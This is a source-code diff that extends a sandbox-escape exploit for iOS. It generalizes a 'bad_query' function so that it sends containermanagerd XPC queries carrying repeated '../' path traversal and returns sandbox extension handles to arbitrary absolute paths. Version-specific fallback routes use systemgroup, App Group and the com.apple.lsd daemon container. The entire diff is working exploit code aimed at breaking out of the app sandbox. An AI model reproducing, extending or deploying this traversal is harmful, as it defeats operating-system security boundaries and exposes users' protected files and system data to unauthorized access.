@@ -35,7 +35,13 @@ typedef char *(*container_copy_sandbox_token_fn)(void *);
 typedef int64_t (*sandbox_extension_consume_fn)(const char *);
 typedef int (*sandbox_extension_release_fn)(int64_t);
 
-int64_t bad_query(char *path, bool create, char *group_identifier, bool is_group) {
+// Generalized bad_query: escape from any container class the process can
+// query, using `levels` "../" to walk back to the filesystem root before
+// appending the absolute `path`. The container class + identifier only decide
+// which containermanagerd daemon handles the query and what base the
+// traversal starts from; the actual target is always `path`.
+int64_t bad_query_ex(char *path, bool create, uint64_t container_class,
+                     char *identifier_str, bool is_group, int levels) {
     if (!path || path[0] != '/') return -255;
     if (!create) {
         struct stat st;
@@ -68,35 +74,28 @@ int64_t bad_query(char *path, bool create, char *group_identifier, bool is_group
         return -2;
     }
 
-    xpc_object_t identifier;
-    if (group_identifier == NULL) {
-        query_set_class(query, 13);
-        identifier = xpc_string_create("systemgroup.com.apple.mobilegestaltcache");
-    } else {
-        query_set_class(query, 7);
-        identifier = xpc_string_create(group_identifier);
-    }
+    query_set_class(query, container_class);
+    xpc_object_t identifier = xpc_string_create(identifier_str);
     query_set_group_identifiers(query, identifier);
     query_set_part(query, 3);
+
+    // Build "../" * levels + path. Extra levels are harmless — they just stay
+    // at the root — so over-escaping is safe across different container depths.
+    char prefix[512];
+    int off = 0;
+    if (levels < 1) levels = 1;
+    if (levels > 160) levels = 160;
+    for (int i = 0; i < levels; i++) {
+        off += snprintf(prefix + off, sizeof(prefix) - (size_t)off, "../");
+    }
     char *part = NULL;
-    if (group_identifier == NULL) {
-        if (asprintf(&part, "../../../../../../../..%s", path) != -1) {
-            query_set_part_domain(query, part);
-        } else {
-            xpc_release(identifier);
-            query_free(query);
-            dlclose(mgr);
-            return -5;
-        }
+    if (asprintf(&part, "%s%s", prefix, path) != -1) {
+        query_set_part_domain(query, part);
     } else {
-        if (asprintf(&part, "../../../../../../../../..%s", path) != -1) {
-            query_set_part_domain(query, part);
-        } else {
-            xpc_release(identifier);
-            query_free(query);
-            dlclose(mgr);
-            return -5;
-        }
+        xpc_release(identifier);
+        query_free(query);
+        dlclose(mgr);
+        return -5;
     }
 
     if (is_group) {
@@ -130,6 +129,29 @@ int64_t bad_query(char *path, bool create, char *group_identifier, bool is_group
 
     dlclose(mgr);
     return handle;
+}
+
+int64_t bad_query(char *path, bool create, char *group_identifier, bool is_group) {
+    if (group_identifier == NULL) {
+        // Class 13 (systemgroup), MobileGestalt cache target. iOS 27 direct
+        // route; iOS 26 this is blocked, caller should try the App Group or
+        // InternalDaemon fallbacks.
+        return bad_query_ex(path, create, 13, "systemgroup.com.apple.mobilegestaltcache", false, 9);
+    } else {
+        // Class 7 (App Group) sacrifice route, used on iOS 26.
+        return bad_query_ex(path, create, 7, group_identifier, is_group, 10);
+    }
+}
+
+int64_t bad_query_internal_daemon(char *path, bool create) {
+    // Approach D: use a system daemon's class-10 container (InternalDaemon,
+    // accessible on iOS 26 per bad_query's stated support matrix) as the
+    // traversal base instead of an App Group. com.apple.lsd is a known
+    // queryable daemon (also used for csstore-based app discovery). Generous
+    // level count (16) guarantees we reach the filesystem root regardless of
+    // the daemon container's depth. Experimental — only called as a last
+    // resort when systemgroup and App Group routes both fail.
+    return bad_query_ex(path, create, 10, "com.apple.lsd", false, 16);
 }
 
 void bad_query_release(int64_t handle) {
